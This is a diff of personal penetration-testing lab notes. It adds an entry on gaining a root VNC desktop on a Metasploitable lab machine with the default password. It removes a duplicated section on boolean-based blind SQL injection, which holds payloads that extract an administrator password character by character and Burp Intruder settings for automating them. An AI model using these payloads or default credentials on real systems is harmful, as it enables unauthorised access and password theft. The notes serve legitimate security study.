@@ -258,6 +258,12 @@ VRFY username
 550 = user does not exist
 real use: build username list for brute force attacks
 
+VNC access: [DONE]
+vncviewer 192.168.56.104
+default password: password
+got: root GUI desktop — root@metasploitable:/#
+critical: no exploit needed — default credentials = root access
+
 ======================================================
 SSH
 ======================================================
@@ -543,26 +549,8 @@ PostgreSQL alternative: username||':'||password (double pipe)
 
 Lab 11 — Blind SQLi with conditional responses — DONE
 type: boolean-based blind SQLi
-injection point: tracking cookie (not URL parameter)
-feedback mechanism: "Welcome back" appears = TRUE, disappears = FALSE
-
-Lab 11 — Blind SQLi with conditional responses — DONE
-type: boolean-based blind SQLi
 injection point: tracking cookie not URL parameter
 feedback: Welcome back appears = TRUE, disappears = FALSE
-
-methodology:
-1. confirm injection: ' AND 1=1-- (true) vs ' AND 1=2-- (false)
-2. confirm user: ' AND (SELECT username FROM users WHERE username='administrator')='administrator'--
-3. find length: ' AND (SELECT username FROM users WHERE username='administrator' AND LENGTH(password)>N)='administrator'--
-   increment N until Welcome back disappears — that N is the length
-4. extract chars: ' AND SUBSTRING((SELECT password FROM users WHERE username='administrator'),POSITION,1)='CHAR'--
-   use Burp Intruder cluster bomb — position 1-20, chars a-z 0-9
-5. assemble password from results and login
-
-key functions:
-SUBSTRING(string, position, length) — extracts characters
-LENGTH(string)                      — returns string length
 
 Burp Intruder settings:
 attack type: cluster bomb
@@ -654,13 +642,6 @@ methodology:
 key functions:
 SUBSTRING(string, position, length) — extracts characters
 LENGTH(string)                      — returns string length
-
-Burp Intruder settings for blind SQLi:
-attack type: cluster bomb
-payload 1:  numbers 1 to 20 (character positions)
-payload 2:  a-z and 0-9 (characters to test)
-grep match: Welcome back
-result: requests with Welcome back = correct character at that position
 
 difference from in-band SQLi:
 in-band:  see results directly on page
